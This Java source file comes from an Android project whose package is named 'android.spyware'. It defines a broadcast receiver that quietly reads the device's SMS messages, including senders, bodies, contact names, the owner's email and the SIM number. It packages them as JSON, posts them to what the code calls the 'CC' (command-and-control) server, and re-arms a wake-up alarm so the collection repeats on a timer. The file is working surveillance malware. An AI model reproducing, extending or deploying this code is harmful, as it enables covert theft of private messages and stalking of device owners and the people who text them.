package android.spyware;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.preference.PreferenceManager;
import android.provider.Telephony;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;
import static android.spyware.Spyware.TIMER;

/**
 * This broadcast receiver scans all un-scanned SMS messages and sends them to the CC.
 */
public class SendSMSR extends BroadcastReceiver {
    private SharedPreferences prefs;
    private Harvester harvester;

    @Override
    public void onReceive(Context context, Intent intent) {
        prefs = PreferenceManager.getDefaultSharedPreferences(context);
        harvester = new Harvester(context);

        if (harvester.isNetworkConnected()) {
            Log.i(TAG, "::INF  Scanning SMS...");
            ArrayList<SMS> SMSArray = getSMS(context);

            if (SMSArray != null && !SMSArray.isEmpty()) {
                JSONArray jSMSArray = new JSONArray();

                for (int i = 0; i < SMSArray.size(); i++) {
                    JSONObject jSMS = SMSArray.get(i).toJSON();
                    jSMSArray.put(jSMS);
                }

                Param mParams = new Param("SMS", jSMSArray);
                AsyncTask<Param, Void, Integer> PostJSONArray = new PostDataAT();

                try {
                    PostJSONArray.execute(mParams);

                    if (PostJSONArray.get().equals(200)) {
                        // Update the newest time-stamp scanned
                        prefs.edit().putLong("SendSMSR", SMSArray.get(0).getDate().getTime()).apply();
                        if (DEV_MODE)
                            Log.i(TAG, "::INF  SendSMSR.onReceive(): SharedPreferences updated.");
                    }
                } catch (Exception e) {
                    Log.wtf(TAG, "::ERR   " + Log.getStackTraceString(e));
                }
            }
        } else
            Log.wtf(TAG, "::ERR  SendSMSR.onReceive(): No internet connectivity.");

        setAlarm(context);
    }

    // Returns an ArrayList containing all the SMS that haven't been already scanned.
    private ArrayList<SMS> getSMS(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                if (DEV_MODE)
                    Log.wtf(TAG, "::ERR  SendSMSR.getSMS(): READ_SMS permission not granted.");
                return null;
            }
        }

        // Get lastScan to only scan the messages that we haven't already scanned(timestamp).
        long lastScan = prefs.getLong("SendSMSR", 0);
        Uri URI;
        String[] COLUMNS;
        String WHERE_CONDITION;
        String SORT_ORDER;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            URI = Telephony.Sms.CONTENT_URI;
            COLUMNS = new String[]{
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms._ID,
                    Telephony.Sms.THREAD_ID,
                    Telephony.Sms.TYPE
            };
            WHERE_CONDITION = "date > " + lastScan;
            SORT_ORDER = Telephony.Sms.DATE + " DESC";
        } else {
            URI = Uri.parse("content://sms/");
            COLUMNS = new String[]{
                    "address",
                    "body",
                    "date",
                    "_id",
                    "thread_id",
                    "type"
            };
            WHERE_CONDITION = "date > " + lastScan;
            SORT_ORDER = "date DESC";
        }

        Cursor cursor = context.getContentResolver().query(
                URI,
                COLUMNS,
                WHERE_CONDITION,
                null,
                SORT_ORDER);

        if (cursor != null && cursor.getCount() > 0) {
            ArrayList<SMS> SMSArray = new ArrayList<>();
            cursor.moveToFirst();

            do {
                long idS = cursor.getLong(3);
                long thread = cursor.getLong(4);
                String contactNo = cursor.getString(0);
                String contactName = harvester.getContactName(contactNo);
                String message = cursor.getString(1);
                int type = cursor.getInt(5);
                Date date = new Date(cursor.getLong(2));

                SMS SMS = new SMS(idS, harvester.getEmail(), harvester.getSim().get("simNo"), thread,
                        contactNo, contactName, message, type, date);

                SMSArray.add(SMS);
            } while (cursor.moveToNext());

            cursor.close();
            return SMSArray;
        }

        return null;
    }

    private void setAlarm(Context context) {
        Calendar nextAlarm = Calendar.getInstance();
        nextAlarm.add(Calendar.MINUTE, TIMER);

        Intent intent = new Intent(context, SendSMSR.class);
        PendingIntent pIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, nextAlarm.getTimeInMillis(), pIntent);

        if (DEV_MODE) {
            Log.i(TAG, "::INF  SendSMS alarm set for: " + nextAlarm.get(Calendar.HOUR) + ":"
                    + nextAlarm.get(Calendar.MINUTE) + ":" + nextAlarm.get(Calendar.SECOND));
        }
    }
}
